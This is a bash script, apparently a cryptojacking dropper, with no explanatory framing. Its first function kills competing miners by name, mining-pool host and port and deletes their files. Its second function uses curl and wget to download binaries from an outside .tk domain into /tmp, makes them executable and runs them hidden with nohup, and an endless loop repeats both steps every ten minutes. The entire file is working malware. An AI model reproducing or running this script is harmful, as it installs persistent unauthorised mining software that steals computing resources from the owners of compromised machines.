#!/bin/bash

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
function kills() {
#ps aux |grep -v sourplum | awk '{if($3>20.0) print $2}' | while read procid
#do
#pkill -f $procid
#done
pkill -f sourplum
pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
rm -rf /tmp/*index_bak*
rm -rf /tmp/*httpd.conf*
rm -rf /tmp/*httpd.conf
rm -rf /tmp/a7b104c270
pkill -f AnXqV.yam
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
ps ax|grep -o './[0-9]* -c'| xargs pkill -f
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
rm -rf /tmp/httpd.conf
rm -rf /tmp/conn
rm -rf /tmp/conns
rm -f /tmp/irq.sh
rm -f /tmp/irqbalanc1
rm -f /tmp/irq
PORT_NUMBER=3333
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
PORT_NUMBER=5555
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
PORT_NUMBER=7777
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
PORT_NUMBER=14444
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
}
function downloadyam() {
	if [ ! -f "/tmp/config.json" ]; then
			curl http://e3sas6tzvehwgpak.tk/config.json -o /tmp/config.json && chmod +x /tmp/config.json
			if [ ! -f "/tmp/config.json" ]; then
				wget http://e3sas6tzvehwgpak.tk/config.json -P /tmp && chmod +x /tmp/config.json
				rm -rf config.json.*
			fi
	fi

	if [ ! -f "/tmp/bashd" ]; then
	    curl http://e3sas6tzvehwgpak.tk/bashd -o /tmp/bashd && chmod +x /tmp/bashd
			if [ ! -f "/tmp/bashd" ]; then
				wget http://e3sas6tzvehwgpak.tk/bashd -P /tmp && chmod +x /tmp/bashd
				rm -rf bashd.*
			fi
			#nohup /tmp/bashd -p $(hostname)>/dev/null 2>&1 &
			nohup /tmp/bashd -p bashd>/dev/null 2>&1 &
	else
			#writecrontab
			#writerc
			p=$(ps aux | grep bashd | grep -v grep | wc -l)
			if [ ${p} -eq 1 ];then
				echo "bashd"
			elif [ ${p} -eq 0 ];then
				#nohup /tmp/bashd -p $(hostname)>/dev/null 2>&1 &
				nohup /tmp/bashd -p bashd>/dev/null 2>&1 &
			else
				echo ""
			fi
	fi

	sleep 15

	p=$(ps aux | grep bashd | grep -v grep | wc -l)
	if [ ${p} -eq 1 ];then
		echo "bashd"
	elif [ ${p} -eq 0 ];then
		if [ ! -f "/tmp/pools.txt" ]; then
				curl http://e3sas6tzvehwgpak.tk/pools.txt -o /tmp/pools.txt && chmod +x /tmp/pools.txt
				if [ ! -f "/tmp/pools.txt" ]; then
					wget http://e3sas6tzvehwgpak.tk/pools.txt -P /tmp && chmod +x /tmp/pools.txt
					rm -rf pools.txt.*
				fi
		fi

		if [ ! -f "/tmp/bashe" ]; then
				curl http://e3sas6tzvehwgpak.tk/bashe -o /tmp/bashe && chmod +x /tmp/bashe
				if [ ! -f "/tmp/bashe" ]; then
					wget http://e3sas6tzvehwgpak.tk/bashe -P /tmp && chmod +x /tmp/bashe
					rm -rf bashe.*
				fi
				nohup /tmp/bashe  -C /tmp/pools.txt>/dev/null 2>&1 &
		else
				p=$(ps aux | grep bashe | grep -v grep | wc -l)
				if [ ${p} -eq 1 ];then
					echo "bashe"
				elif [ ${p} -eq 0 ];then
					nohup /tmp/bashe -C /tmp/pools.txt>/dev/null 2>&1 &
				else
					echo ""
				fi
		fi
	else
		echo ""
	fi
	sleep 15
	if [ ! -f "/tmp/Xagent5" ]; then
			curl http://e3sas6tzvehwgpak.tk/Xagent5 -o /tmp/Xagent5 && chmod +x /tmp/Xagent5
			if [ ! -f "/tmp/Xagent5" ]; then
				wget http://e3sas6tzvehwgpak.tk/Xagent5 -P /tmp && chmod +x /tmp/Xagent5
				rm -rf Xagent5.*
			fi
			nohup /tmp/Xagent5 >/dev/null 2>&1 &
	else
			p=$(ps aux | grep Xagent5 | grep -v grep | wc -l)
			if [ ${p} -eq 1 ];then
				echo "Xagent5"
			elif [ ${p} -eq 0 ];then
				nohup /tmp/Xagent5 >/dev/null 2>&1 &
			else
				echo ""
			fi
	fi
}

while [ 1 ]
do
	kills
	downloadyam
	sleep 600
done
